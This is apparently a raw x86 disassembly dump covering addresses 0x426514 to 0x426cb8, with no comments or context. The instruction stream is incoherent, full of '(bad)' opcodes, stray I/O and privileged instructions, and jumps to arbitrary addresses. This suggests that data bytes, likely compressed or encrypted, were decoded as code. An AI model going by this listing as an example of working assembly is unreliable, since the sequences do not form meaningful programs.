  426514:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426515:	(bad)  
  426516:	nop
  426517:	xchg   esp,eax
  426518:	nop
  426519:	pop    esi
  42651a:	inc    esp
  42651b:	push   es
  42651c:	(bad)  
  42651d:	add    BYTE PTR [edx+0x61],ch
  426520:	pusha  
  426521:	out    dx,eax
  426522:	cmp    bh,BYTE PTR [eax+0x15064f2b]
  426528:	hlt    
  426529:	push   esi
  42652a:	loope  0x426574
  42652c:	lahf   
  42652d:	(bad)  
  42652e:	xor    dl,bl
  426530:	mov    ecx,0xff39fe0c
  426535:	ja     0x4264e6
  426537:	lods   al,BYTE PTR ds:[esi]
  426538:	fimul  WORD PTR [ebp-0x78]
  42653b:	in     eax,dx
  42653c:	or     BYTE PTR [eax-0x6a63b2e8],dl
  426542:	test   ebx,esi
  426544:	mov    dl,0x10
  426546:	loopne 0x42654f
  426548:	dec    eax
  426549:	add    al,0xd
  42654b:	pop    ebx
  42654c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42654d:	mov    cl,0xb7
  42654f:	je     0x426540
  426551:	mov    dl,0xb9
  426553:	icebp  
  426554:	xchg   esp,eax
  426555:	popf   
  426556:	mov    cl,0x70
  426558:	dec    ecx
  426559:	push   edi
  42655a:	shl    DWORD PTR [edx],cl
  42655c:	jnp    0x4265dd
  42655e:	lock jnp 0x426556
  426561:	cmp    DWORD PTR [edx+0x75],0xd66583cf
  426568:	pop    es
  426569:	mov    eax,0xf82d2b61
  42656e:	push   ds
  42656f:	adc    ebx,DWORD PTR [ebx-0x3]
  426572:	cmp    eax,0xb8b1ca55
  426577:	cmc    
  426578:	in     al,dx
  426579:	pop    ebp
  42657a:	mov    bh,0x66
  42657c:	xor    BYTE PTR [esi+eiz*1],ch
  42657f:	sub    esp,ebx
  426581:	sbb    edi,esi
  426583:	pop    ss
  426584:	push   ss
  426585:	not    DWORD PTR [edx]
  426587:	mov    WORD PTR [esi+0x38640bc8],fs
  42658d:	mov    ah,0x38
  42658f:	or     ebp,ebp
  426591:	xor    DWORD PTR [eax],edx
  426593:	(bad)  
  426594:	lods   al,BYTE PTR ds:[esi]
  426595:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426596:	das    
  426597:	sar    BYTE PTR [ebp+0x704c07a1],1
  42659d:	mov    gs,edx
  42659f:	retf   0xcd4
  4265a2:	jmp    0x1ad4:0x2600d3f0
  4265a9:	iret   
  4265aa:	aad    0x47
  4265ac:	push   edi
  4265ad:	in     al,0x35
  4265af:	inc    ebx
  4265b0:	cmp    eax,0x7850925f
  4265b6:	out    dx,al
  4265b7:	and    ebp,edx
  4265b9:	dec    ecx
  4265ba:	sti    
  4265bb:	aas    
  4265bc:	je     0x426589
  4265be:	xchg   edi,eax
  4265bf:	dec    esi
  4265c0:	add    edi,DWORD PTR [edi]
  4265c2:	push   ds
  4265c3:	sbb    DWORD PTR [eax-0x6],esi
  4265c6:	ret    0x429e
  4265c9:	(bad)  
  4265ca:	out    0x90,eax
  4265cc:	pop    ebx
  4265cd:	ficom  WORD PTR [edi+0x73]
  4265d0:	xchg   esp,eax
  4265d1:	mov    edx,0x75d56c08
  4265d6:	retf   0xb6e7
  4265d9:	aam    0x5d
  4265db:	(bad)  
  4265dc:	pop    edi
  4265dd:	jmp    DWORD PTR [ebx+0x7f]
  4265e0:	mov    ebp,0x10e41332
  4265e5:	cmc    
  4265e6:	add    ebx,DWORD PTR [edx-0x3c]
  4265e9:	mov    dl,0xd5
  4265eb:	xor    BYTE PTR cs:[ecx+0x5b],dh
  4265ef:	ss inc ebp
  4265f1:	push   esp
  4265f2:	jno    0x426646
  4265f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4265f5:	imul   bh
  4265f7:	xlat   BYTE PTR ds:[ebx]
  4265f8:	cmp    bh,al
  4265fa:	fstp   st(7)
  4265fc:	inc    ecx
  4265fd:	(bad)  
  4265fe:	outs   dx,DWORD PTR ds:[esi]
  4265ff:	pop    esi
  426600:	sub    cl,BYTE PTR [ebx]
  426602:	fwait
  426603:	mov    edx,0x5d6604d7
  426608:	mov    dl,0x53
  42660a:	in     eax,dx
  42660b:	adc    eax,0xeaa11b3a
  426610:	jbe    0x42663d
  426612:	add    bl,BYTE PTR [eax+0xce24681]
  426618:	aam    0x8
  42661a:	fsub   st,st(4)
  42661c:	mov    ebp,0xe45bdc87
  426621:	aam    0xee
  426623:	call   0x1f8723a9
  426628:	mov    eax,0xc7edb47e
  42662d:	xchg   esp,eax
  42662e:	mov    ecx,0x680b5512
  426633:	xchg   BYTE PTR [eax-0x58],cl
  426636:	inc    esp
  426637:	sub    BYTE PTR [ebx],cl
  426639:	sahf   
  42663a:	ror    BYTE PTR [ebx-0x29],1
  42663d:	xchg   ebx,eax
  42663e:	ins    DWORD PTR es:[edi],dx
  42663f:	mov    BYTE PTR [edx+0x790e8d3c],al
  426645:	(bad)  
  426647:	mov    edi,0xc3199576
  42664c:	xchg   ecx,eax
  42664d:	xchg   esi,eax
  42664e:	jmp    0x426e:0x75ebe580
  426655:	clc    
  426656:	pop    ebp
  426657:	cmp    ch,BYTE PTR [ecx-0x3be85778]
  42665d:	aad    0x46
  42665f:	fdivr  st(4),st
  426661:	adc    al,0xeb
  426663:	lock inc edx
  426665:	push   ds
  426666:	jge    0x4266af
  426668:	or     eax,0x9be09fb8
  42666d:	and    bh,BYTE PTR [eax]
  42666f:	or     DWORD PTR [eax+eiz*8],edx
  426672:	ror    BYTE PTR [edi+0x38],cl
  426675:	push   es
  426676:	push   edi
  426677:	and    eax,DWORD PTR [esp+esi*8-0x3a]
  42667b:	mov    eax,DWORD PTR [ebp-0x52faf666]
  426681:	rcl    BYTE PTR [ebp+0x7b],1
  426684:	jg     0x426630
  426686:	pop    ds
  426687:	and    esp,DWORD PTR [esi-0x5f7a145]
  42668d:	ror    BYTE PTR [esi+0x528c9bf8],1
  426693:	shl    ecx,1
  426695:	xor    edi,DWORD PTR [edx]
  426697:	adc    DWORD PTR [edx+0x6],esi
  42669a:	xor    DWORD PTR [ebx+ecx*4-0x376bc521],ebp
  4266a1:	push   0xffffffe0
  4266a3:	jne    0x42665d
  4266a5:	int    0x54
  4266a7:	sbb    BYTE PTR [ebp+ebp*2+0x53],0xed
  4266ac:	(bad)  
  4266ad:	mov    bl,0xe4
  4266af:	sub    BYTE PTR [ebx+0x20],0x71
  4266b3:	xchg   BYTE PTR [eax-0x4a],dl
  4266b6:	outs   dx,BYTE PTR ds:[esi]
  4266b7:	int3   
  4266b8:	outs   dx,DWORD PTR ds:[esi]
  4266b9:	outs   dx,DWORD PTR ds:[esi]
  4266ba:	(bad)  
  4266bb:	fwait
  4266bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4266be:	or     al,0x54
  4266c0:	adc    eax,0xf0374636
  4266c5:	xchg   edx,eax
  4266c6:	arpl   bx,di
  4266c8:	mov    eax,ds:0x2d66a1c3
  4266cd:	jno    0x42669e
  4266cf:	int    0xbb
  4266d1:	mov    ah,0x4a
  4266d3:	push   edi
  4266d4:	xchg   ecx,eax
  4266d5:	ror    esp,cl
  4266d7:	and    BYTE PTR [edx-0x1e6e17ef],0x60
  4266de:	imul   DWORD PTR [esi+0x64]
  4266e1:	inc    ebx
  4266e2:	pop    ecx
  4266e3:	aam    0x6d
  4266e5:	adc    eax,0x711abd01
  4266ea:	push   ecx
  4266eb:	xchg   ecx,eax
  4266ec:	xchg   esi,eax
  4266ed:	mov    WORD PTR [esi],?
  4266ef:	sti    
  4266f0:	pop    esp
  4266f1:	mov    bh,0x3f
  4266f3:	jge    0x426762
  4266f5:	stos   BYTE PTR es:[edi],al
  4266f6:	pop    ds
  4266f7:	jmp    0x426704
  4266f9:	push   eax
  4266fa:	(bad)  
  4266fb:	cs enter 0xe79c,0x69
  426700:	outs   dx,DWORD PTR ds:[esi]
  426701:	daa    
  426702:	mov    al,0x5c
  426704:	jnp    0x4266eb
  426706:	fucomp st(1)
  426708:	jl     0x4266c0
  42670a:	mov    al,ds:0x4fcc545f
  42670f:	repz mov bh,0x34
  426712:	add    al,0x1e
  426714:	inc    edx
  426715:	jne    0x66516d94
  42671b:	xchg   edx,eax
  42671c:	pop    ebx
  42671d:	in     eax,0xab
  42671f:	mov    eax,ds:0xd12c4aad
  426724:	sub    esi,DWORD PTR [ebx+0x3b29aa77]
  42672a:	mov    bh,0xf3
  42672c:	add    BYTE PTR [ecx+0x3d030f77],dh
  426732:	sub    BYTE PTR [ecx],0x9a
  426735:	inc    edi
  426736:	dec    esp
  426737:	test   DWORD PTR [edx+0x32e49f9e],ebx
  42673d:	loop   0x4266f0
  42673f:	imul   ecx,esi,0xb3dac3a9
  426745:	sti    
  426746:	jns    0x426714
  426748:	or     al,0x16
  42674a:	push   cx
  42674c:	fsub   QWORD PTR [edx+esi*8]
  42674f:	in     al,dx
  426750:	and    al,0x4c
  426752:	cmp    ebp,DWORD PTR [esi+0x7e]
  426755:	fild   QWORD PTR [eax]
  426757:	xlat   BYTE PTR ds:[ebx]
  426758:	sub    bl,BYTE PTR [ebx]
  42675a:	jne    0x426798
  42675c:	jns    0x42673d
  42675e:	inc    ebx
  42675f:	xlat   BYTE PTR ds:[ebx]
  426760:	jbe    0x4267ad
  426762:	adc    esi,ecx
  426764:	mov    dl,0x11
  426766:	mov    BYTE PTR [esi+0x1c3528b1],cl
  42676c:	in     eax,0xeb
  42676e:	cli    
  42676f:	xchg   ebx,eax
  426770:	ja     0x4266ff
  426772:	in     al,0xe4
  426774:	push   esi
  426775:	xchg   esp,eax
  426776:	push   eax
  426777:	gs dec ebx
  426779:	sbb    eax,0x83a843d9
  42677e:	test   eax,0xe524d1ef
  426783:	mov    edi,0x417f8bc8
  426788:	xchg   esi,eax
  426789:	cmp    eax,DWORD PTR [edx+0x38]
  42678c:	sbb    edx,edi
  42678e:	sbb    al,0xda
  426790:	push   edx
  426791:	xchg   ecx,eax
  426792:	sbb    DWORD PTR [edx],ecx
  426794:	aam    0x2
  426796:	rcl    DWORD PTR [edx+0x2d],1
  426799:	inc    esp
  42679a:	jbe    0x4267be
  42679c:	or     DWORD PTR [eax+0x31],0x643a0bd7
  4267a3:	xor    al,0xda
  4267a5:	pushf  
  4267a6:	jl     0x4267f9
  4267a8:	add    DWORD PTR [esi-0x7bf4ad92],ebx
  4267ae:	push   esp
  4267af:	cdq    
  4267b0:	bound  edx,QWORD PTR [ebx]
  4267b2:	addr16 pop edx
  4267b4:	xor    BYTE PTR [esi],ch
  4267b6:	dec    ecx
  4267b7:	adc    al,0xf4
  4267b9:	cmp    bh,dl
  4267bb:	std    
  4267bc:	or     bh,bl
  4267be:	aas    
  4267bf:	push   edx
  4267c0:	pop    edi
  4267c1:	mov    ecx,0xa985a24d
  4267c6:	mov    ebp,0x5d04aebf
  4267cb:	das    
  4267cc:	aam    0x0
  4267ce:	rcl    DWORD PTR [edx+0x5ca644cb],1
  4267d4:	jno    0x4267f1
  4267d6:	push   eax
  4267d7:	shr    esi,0x94
  4267da:	and    ch,ch
  4267dc:	(bad)  
  4267dd:	mov    al,ds:0x61411962
  4267e2:	mov    cl,BYTE PTR [ebx]
  4267e4:	mov    edi,DWORD PTR [esi-0x42]
  4267e7:	push   ebx
  4267e8:	or     ecx,esp
  4267ea:	pop    ebx
  4267eb:	cmp    BYTE PTR [ecx+edx*4+0x36],ch
  4267ef:	fwait
  4267f0:	sar    al,1
  4267f2:	rcr    BYTE PTR [ebx+0xb0346f1],0x76
  4267f9:	inc    edx
  4267fa:	sti    
  4267fb:	(bad)  
  4267fc:	sahf   
  4267fd:	outs   dx,BYTE PTR ds:[esi]
  4267fe:	mov    WORD PTR [edi-0x61c545e5],fs
  426804:	jp     0x4267b8
  426806:	hlt    
  426807:	cwde   
  426808:	iret   
  426809:	pop    esp
  42680a:	clc    
  42680b:	lods   al,BYTE PTR ds:[esi]
  42680c:	and    al,BYTE PTR [edx+0x79647563]
  426812:	dec    edx
  426813:	push   ebx
  426814:	jmp    0x2d55:0xa82da1bc
  42681b:	add    al,0x7b
  42681d:	nop
  42681e:	mov    ah,0x12
  426820:	pop    ebp
  426821:	(bad)  
  426822:	fwait
  426823:	dec    edx
  426824:	sar    DWORD PTR ds:0x7d32379f,1
  42682a:	imul   eax,DWORD PTR [edi-0x34],0xf
  42682e:	xchg   edi,eax
  42682f:	pushf  
  426830:	leave  
  426831:	jg     0x426858
  426833:	imul   edx,ecx,0x2ec4630e
  426839:	add    eax,0x35434a2b
  42683e:	(bad)  
  42683f:	in     eax,0xd2
  426841:	idiv   BYTE PTR ds:0xe12b2590
  426847:	xchg   esp,eax
  426848:	inc    ecx
  426849:	adc    eax,0x2c6c0d6d
  42684e:	push   0x19df5429
  426853:	cs ins DWORD PTR es:[edi],dx
  426855:	stc    
  426856:	adc    eax,0x73ba3c74
  42685b:	jno    0x4268c8
  42685d:	(bad)  
  42685e:	mov    cl,0xcc
  426860:	loopne 0x426813
  426862:	dec    ecx
  426863:	out    dx,eax
  426864:	pop    ebp
  426865:	repz retf 0x6f2c
  426869:	jmp    0xf900152e
  42686e:	add    al,0x7f
  426870:	xlat   BYTE PTR ds:[ebx]
  426871:	mov    esi,edx
  426873:	pop    ebp
  426874:	lea    eax,[eax]
	...
  42687e:	add    BYTE PTR [eax],al
  426880:	add    cl,al
  426882:	into   
  426883:	psrld  mm1,QWORD PTR [edi]
  426886:	rcr    ebp,cl
  426888:	fistp  QWORD PTR [ebp+edi*8+0x37]
  42688c:	push   esp
  42688d:	push   edx
  42688e:	add    eax,0xdf01b0c7
  426893:	add    DWORD PTR [eax],eax
  426895:	lods   al,BYTE PTR ds:[esi]
  426896:	add    eax,DWORD PTR [eax]
  426898:	add    dl,cl
  42689a:	cdq    
  42689b:	add    eax,0x54e32c94
  4268a0:	mov    dl,0x41
  4268a2:	xor    al,0x30
  4268a4:	or     al,0x15
  4268a6:	push   esp
  4268a7:	jno    0x426829
  4268a9:	push   esi
  4268aa:	cli    
  4268ab:	imul   eax,esi,0xc4d0ca90
  4268b1:	mov    ds:0xba1aeb75,al
  4268b6:	push   ss
  4268b7:	pop    ds
  4268b8:	cwde   
  4268b9:	je     0x4268ce
  4268bb:	ror    BYTE PTR [edi-0x5c264cc4],cl
  4268c1:	push   eax
  4268c2:	xchg   esp,eax
  4268c3:	retf   
  4268c4:	retf   0xa0e0
  4268c7:	cmp    bp,WORD PTR ds:0x92220f49
  4268ce:	fisubr WORD PTR [edi]
  4268d0:	(bad)  
  4268d2:	retf   
  4268d3:	mov    dl,bl
  4268d5:	cdq    
  4268d6:	pop    esi
  4268d7:	and    eax,0x25cf0af6
  4268dc:	lods   al,BYTE PTR ds:[esi]
  4268dd:	mov    gs,WORD PTR [edi-0x21f0709b]
  4268e3:	adc    DWORD PTR [edx+ebp*8],eax
  4268e6:	pop    ebp
  4268e7:	out    0xd0,eax
  4268e9:	mov    dh,0xc
  4268eb:	ret    
  4268ec:	sti    
  4268ed:	test   edi,edx
  4268ef:	jb     0x42694c
  4268f1:	rep outs dx,BYTE PTR ds:[esi]
  4268f3:	sbb    ch,BYTE PTR [edx+esi*2+0x61769554]
  4268fa:	jbe    0x426904
  4268fc:	and    DWORD PTR gs:[eax+0x7e],ecx
  426900:	inc    esp
  426901:	mov    ds:0xc18e0276,eax
  426906:	pop    ebp
  426907:	push   esp
  426908:	pop    ebp
  426909:	add    BYTE PTR [ebp+0x52],dl
  42690c:	mov    bh,0x37
  42690e:	pop    edi
  42690f:	mov    dh,al
  426911:	out    0xec,eax
  426913:	pop    es
  426914:	add    BYTE PTR [ecx-0x39],bh
  426917:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426918:	(bad)  
  426919:	cmp    BYTE PTR [edi],al
  42691b:	pop    esp
  42691c:	push   ds
  42691d:	jno    0x4268f3
  42691f:	push   ebp
  426920:	lock rcr DWORD PTR [eax+0x207370b2],1
  426927:	out    0xcd,al
  426929:	dec    eax
  42692a:	sbb    bl,BYTE PTR [edi+0x59]
  42692d:	sub    BYTE PTR [esp+ebx*4],dl
  426930:	scas   eax,DWORD PTR es:[edi]
  426931:	loope  0x4268f7
  426933:	add    eax,0x90ebd9de
  426938:	call   0xc15a:0xab3504f7
  42693f:	push   0xccda6110
  426944:	(bad)  
  426945:	(bad)  [esi]
  426947:	push   esp
  426948:	repnz test eax,0x5cf1a2b4
  42694e:	mov    ds:0x583fd2ee,al
  426953:	xchg   ecx,eax
  426954:	xlat   BYTE PTR ds:[ebx]
  426955:	aad    0x79
  426957:	xor    al,0xd2
  426959:	sar    BYTE PTR [edx+0x73972c1f],cl
  42695f:	dec    ebp
  426960:	push   edi
  426961:	pop    ebx
  426962:	cmp    DWORD PTR [ebx],eax
  426964:	popf   
  426965:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426966:	jp     0x426919
  426968:	pushf  
  426969:	fisubr WORD PTR [esi+esi*1+0x35f695ae]
  426970:	add    al,0xe
  426972:	mov    fs,edi
  426974:	lds    ebp,FWORD PTR [esi-0x75014937]
  42697a:	(bad)  
  42697b:	or     esp,DWORD PTR [edi-0x33]
  42697e:	fwait
  42697f:	cwde   
  426980:	nop
  426981:	jg     0x4269d2
  426983:	outs   dx,BYTE PTR ds:[esi]
  426984:	pop    ecx
  426985:	pop    ecx
  426986:	leave  
  426987:	sub    esp,DWORD PTR [ecx+0x24]
  42698a:	call   0x7e8e02c4
  42698f:	les    eax,FWORD PTR [ecx-0xf3195a0]
  426995:	pop    ss
  426996:	xchg   dh,ah
  426998:	inc    edx
  426999:	ins    BYTE PTR es:[edi],dx
  42699a:	ins    BYTE PTR es:[edi],dx
  42699b:	ss adc bh,bl
  42699e:	(bad)  
  4269a0:	jns    0x42694a
  4269a2:	xor    BYTE PTR [ebp+eiz*4+0x2b],0x6e
  4269a7:	jle    0x4269ac
  4269a9:	inc    bl
  4269ab:	pop    eax
  4269ac:	sahf   
  4269ad:	imul   ecx,edx,0x6d681d90
  4269b3:	pop    edx
  4269b4:	sar    BYTE PTR [eax+0x5a],cl
  4269b7:	or     esp,0x23aad5a1
  4269bd:	push   ecx
  4269be:	std    
  4269bf:	mov    edi,DWORD PTR [esi+0x39]
  4269c2:	daa    
  4269c3:	daa    
  4269c4:	push   edx
  4269c5:	daa    
  4269c6:	outs   dx,DWORD PTR ds:[esi]
  4269c7:	lods   al,BYTE PTR ds:[esi]
  4269c8:	push   ebp
  4269c9:	enter  0x5d59,0x58
  4269cd:	fild   WORD PTR [edi+esi*1-0x7e]
  4269d2:	push   cs
  4269d3:	inc    ecx
  4269d4:	pusha  
  4269d5:	mov    ebx,0x6311507f
  4269da:	adc    BYTE PTR [ebx+0x36fd93c4],cl
  4269e0:	pop    edi
  4269e1:	loopne 0x4269e2
  4269e3:	xchg   ebp,eax
  4269e4:	mov    dh,0xe3
  4269e6:	not    BYTE PTR [esi]
  4269e8:	cs ins DWORD PTR es:[edi],dx
  4269ea:	xchg   BYTE PTR [eax-0x3e],ch
  4269ed:	shl    BYTE PTR [ebp+0x1d81f195],1
  4269f3:	mov    edi,0x92d18464
  4269f8:	pop    ecx
  4269f9:	or     eax,0xf03087bc
  4269fe:	imul   edx,DWORD PTR [ecx],0x63edc54e
  426a04:	add    al,0x57
  426a06:	(bad)  
  426a07:	je     0x4269cf
  426a09:	xchg   esi,eax
  426a0a:	icebp  
  426a0b:	aas    
  426a0c:	js     0x4269e2
  426a0e:	addr16 jmp 0x426a65
  426a11:	sar    ecx,1
  426a13:	dec    ebx
  426a14:	imul   esp,edi,0xc8df46ca
  426a1a:	std    
  426a1b:	clc    
  426a1c:	repnz mov al,ds:0x8ab79f5d
  426a22:	cmp    eax,0xc4a5374a
  426a27:	hlt    
  426a28:	outs   dx,BYTE PTR ds:[esi]
  426a29:	inc    ebx
  426a2a:	ds (bad) 
  426a2c:	adc    cl,BYTE PTR [ebx+eiz*8]
  426a2f:	mov    ebx,0x2e59a5bc
  426a34:	(bad)  ds:0x8eece53b
  426a3a:	(bad)  
  426a3b:	mov    BYTE PTR [eax+ebp*1+0x7ddf8ba6],dh
  426a42:	add    ch,BYTE PTR [ebx]
  426a44:	stc    
  426a45:	test   DWORD PTR [eax-0x7b772723],ebx
  426a4b:	jnp    0x426a9d
  426a4d:	xchg   ebp,eax
  426a4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426a4f:	jb     0x426abf
  426a51:	imul   ebx,DWORD PTR [esi+0x61],0xd25e600e
  426a58:	cs push ebx
  426a5a:	mov    edx,0x41f20e9a
  426a5f:	addr16 mov bh,0xd6
  426a62:	sbb    ah,bh
  426a64:	js     0x426ae2
  426a66:	je     0x426a65
  426a68:	cs mov esi,0xe2402443
  426a6e:	les    ecx,FWORD PTR [edi]
  426a70:	add    eax,eax
  426a72:	cmp    al,dl
  426a74:	and    dh,cl
  426a76:	js     0x426a11
  426a78:	push   eax
  426a79:	mov    esi,DWORD PTR [ecx-0x26]
  426a7c:	(bad)  
  426a7d:	retf   
  426a7e:	xchg   di,bx
  426a81:	scas   eax,DWORD PTR es:[edi]
  426a82:	push   ds
  426a83:	adc    ecx,eax
  426a85:	mov    edi,0x96b6ef11
  426a8a:	mov    bh,0xa6
  426a8c:	mov    eax,0x3cbf3041
  426a91:	scas   eax,DWORD PTR es:[edi]
  426a92:	jecxz  0x426a3d
  426a94:	out    dx,al
  426a95:	mov    WORD PTR [edx*1+0x485fa62d],fs
  426a9c:	sbb    ah,BYTE PTR [ecx+0x2c]
  426a9f:	seto   BYTE PTR [ecx+0x1f]
  426aa3:	pop    edi
  426aa4:	mov    dl,0xf8
  426aa6:	xor    al,0x9b
  426aa8:	stc    
  426aa9:	dec    esp
  426aaa:	(bad)  
  426aab:	cli    
  426aac:	pop    esi
  426aad:	cli    
  426aae:	lods   eax,DWORD PTR ds:[esi]
  426aaf:	sub    BYTE PTR [edi+0x5b],dl
  426ab2:	mov    ebx,DWORD PTR [ecx-0x40]
  426ab5:	push   eax
  426ab6:	jns    0x426ae8
  426ab8:	xchg   edi,eax
  426ab9:	adc    ch,dl
  426abb:	sub    eax,0x7209fbe1
  426ac0:	lock icebp 
  426ac2:	popa   
  426ac3:	(bad)  
  426ac4:	mov    bl,0x9d
  426ac6:	adc    ah,BYTE PTR ds:0xefabe012
  426acc:	sahf   
  426acd:	call   0x1233edb3
  426ad2:	fadd   DWORD PTR [edi]
  426ad4:	mov    esp,DWORD PTR [ebx+0x59]
  426ad7:	mov    cl,0x3d
  426ad9:	aad    0x8d
  426adb:	cmp    eax,0x8d8dc7dc
  426ae0:	jbe    0x426a69
  426ae2:	outs   dx,BYTE PTR ds:[esi]
  426ae3:	mov    al,0xec
  426ae5:	in     eax,0x42
  426ae7:	jne    0x426a72
  426ae9:	xor    eax,0x3064571b
  426aee:	dec    esp
  426aef:	cmc    
  426af0:	push   edx
  426af1:	push   edi
  426af2:	mov    esi,0xdeb313e
  426af7:	fidivr WORD PTR [esi+0x54]
  426afa:	mov    ds:0x23b3a372,al
  426aff:	sbb    DWORD PTR cs:[edi-0x31cda5dc],ebx
  426b06:	xor    eax,edi
  426b08:	cmp    ah,BYTE PTR [ecx]
  426b0a:	cmp    cl,bl
  426b0c:	mov    WORD PTR [ecx+0x2b],cs
  426b0f:	test   bl,dh
  426b11:	cmp    eax,0xee2f10eb
  426b16:	retf   0x625d
  426b19:	stos   BYTE PTR es:[edi],al
  426b1a:	mov    ebx,ebp
  426b1c:	(bad)  
  426b1d:	je     0x426ac2
  426b1f:	adc    DWORD PTR [edx+0x69dac5fa],esp
  426b25:	add    BYTE PTR [esi-0x551fa40a],0xf
  426b2c:	retf   0x1880
  426b2f:	xchg   BYTE PTR [esi-0x20426232],cl
  426b35:	idiv   DWORD PTR [edi]
  426b37:	mov    eax,0x3de87f9b
  426b3c:	mov    bl,0x89
  426b3e:	cli    
  426b3f:	push   ebp
  426b40:	frndint 
  426b42:	jnp    0x426b78
  426b44:	pop    ebx
  426b45:	fisttp WORD PTR [ebx+0x3a3f4442]
  426b4b:	popa   
  426b4c:	xor    eax,0x215d1467
  426b51:	outs   dx,DWORD PTR ds:[esi]
  426b52:	in     eax,0x2b
  426b54:	sub    DWORD PTR [eax-0x4536ff25],esi
  426b5a:	out    0xa,al
  426b5c:	aas    
  426b5d:	ror    ah,0xb6
  426b60:	inc    ebp
  426b61:	jno    0x426b1c
  426b63:	sub    al,0x4f
  426b65:	ret    0x7301
  426b68:	mov    ah,0x55
  426b6a:	pop    ecx
  426b6b:	mov    edx,0xe54fe837
  426b70:	ret    0xd25d
  426b73:	xchg   esi,eax
  426b74:	dec    ecx
  426b75:	pop    esi
  426b76:	sahf   
  426b77:	push   ds
  426b78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426b79:	cwde   
  426b7a:	ins    BYTE PTR es:[edi],dx
  426b7b:	loope  0x426b26
  426b7d:	mov    dh,0x5c
  426b80:	jne    0x426b2f
  426b82:	or     edi,0x74
  426b85:	adc    dl,BYTE PTR [edx]
  426b87:	in     eax,0x31
  426b89:	das    
  426b8a:	dec    ecx
  426b8b:	loope  0x426bf2
  426b8d:	mov    cl,0x58
  426b8f:	push   edi
  426b90:	js     0x426b18
  426b92:	das    
  426b93:	call   0x546df404
  426b98:	pop    edx
  426b99:	mov    ds:0x21877b1d,al
  426b9e:	lea    ebp,[eax-0x2e]
  426ba1:	hlt    
  426ba2:	out    dx,eax
  426ba3:	gs std 
  426ba5:	push   ss
  426ba6:	push   ebx
  426ba7:	inc    esp
  426ba8:	jo     0x426c20
  426baa:	rcl    esp,cl
  426bac:	dec    eax
  426bad:	sbb    BYTE PTR [edx],bl
  426baf:	sbb    DWORD PTR [eax-0x261af759],ecx
  426bb5:	add    eax,0x79310c78
  426bba:	jg     0x426b3f
  426bbc:	fild   QWORD PTR [eax]
  426bbe:	test   DWORD PTR [ebx],ebp
  426bc0:	add    dl,BYTE PTR [ebp-0x37]
  426bc3:	pop    ebx
  426bc4:	int3   
  426bc5:	push   0x6afbb501
  426bca:	mov    ebp,0x572bbec4
  426bcf:	mov    cl,0x75
  426bd1:	sar    BYTE PTR [ebx],1
  426bd3:	inc    esi
  426bd4:	mov    ds:0x71fd415c,eax
  426bd9:	mov    ebx,0x5d52713a
  426bde:	test   BYTE PTR [edx],bl
  426be0:	scas   al,BYTE PTR es:[edi]
  426be1:	and    dh,bh
  426be3:	xchg   ebx,eax
  426be4:	cmp    dx,bx
  426be7:	stos   BYTE PTR es:[edi],al
  426be8:	inc    ebp
  426be9:	call   0xd5a0cf42
  426bee:	and    edx,DWORD PTR [esi-0x1b2be68f]
  426bf4:	call   0x8c78008c
  426bf9:	aaa    
  426bfa:	mov    esi,0x5a69c66d
  426bff:	sahf   
  426c00:	mov    edx,esp
  426c02:	(bad)  
  426c03:	cmp    DWORD PTR [ecx],ebx
  426c05:	mov    ecx,0xdbe6bbc4
  426c0a:	push   ecx
  426c0b:	sbb    dh,BYTE PTR [ebx+0x28]
  426c0e:	sub    al,0x78
  426c10:	add    al,0x78
  426c12:	mov    eax,0x15dd069a
  426c17:	xlat   BYTE PTR ds:[ebx]
  426c18:	xchg   esi,eax
  426c19:	jnp    0x426be7
  426c1b:	cmp    ecx,ebp
  426c1d:	aam    0xde
  426c1f:	mov    al,ds:0x104acd21
  426c24:	popf   
  426c25:	cmp    al,0xf6
  426c27:	xchg   ecx,eax
  426c28:	fdivrp st(4),st
  426c2a:	pusha  
  426c2b:	jne    0x426bfe
  426c2d:	test   eax,0x129a4f61
  426c32:	imul   ebp,DWORD PTR [ebp-0x46],0xfe0b7ed0
  426c39:	cdq    
  426c3a:	dec    ecx
  426c3b:	in     al,dx
  426c3c:	add    bl,BYTE PTR [edi]
  426c3e:	mov    ebp,0x5968a2ce
  426c43:	dec    edx
  426c44:	arpl   WORD PTR [eax],ax
	...
  426c4e:	add    BYTE PTR [eax],al
  426c50:	add    al,dh
  426c52:	lock pusha 
  426c54:	pushf  
  426c55:	pusha  
  426c56:	pushf  
  426c57:	cld    
  426c58:	cld    
  426c59:	push   es
  426c5a:	dec    edx
  426c5b:	lock cmp eax,DWORD PTR [ecx+eax*8-0x1d529825]
  426c63:	add    DWORD PTR [eax],eax
  426c65:	lods   al,BYTE PTR ds:[esi]
  426c66:	add    eax,DWORD PTR [eax]
  426c68:	add    BYTE PTR [ecx],bh
  426c6a:	scas   al,BYTE PTR es:[edi]
  426c6b:	or     edi,eax
  426c6d:	mov    eax,ds:0xa6cb1a92
  426c72:	je     0x5f4502f7
  426c78:	test   al,0x2e
  426c7a:	sub    eax,0xf894a928
  426c7f:	les    esi,FWORD PTR [ebp-0x628d90c]
  426c85:	fbld   TBYTE PTR [esi+0x51]
  426c88:	outs   dx,DWORD PTR ds:[esi]
  426c89:	inc    ebx
  426c8a:	add    al,0xf0
  426c8c:	std    
  426c8d:	out    0x82,eax
  426c8f:	sub    dh,BYTE PTR [eax+0x11]
  426c92:	cs stc 
  426c94:	cmp    bh,bl
  426c96:	xchg   ebx,eax
  426c97:	push   esi
  426c98:	pop    esp
  426c99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426c9a:	cdq    
  426c9b:	(bad)  
  426c9c:	outs   dx,DWORD PTR ds:[esi]
  426c9d:	sub    DWORD PTR [ecx-0x2b],0xffffffef
  426ca1:	mov    eax,0x233733d4
  426ca6:	pop    ebp
  426ca7:	mov    ch,BYTE PTR [bx+0x5f]
  426cab:	dec    esi
  426cac:	mov    dl,0x3f
  426cae:	lock cmc 
  426cb0:	in     al,dx
  426cb1:	sub    eax,0x636ebfd6
  426cb6:	in     al,0xdd
  426cb8:	xchg   ebp,eax
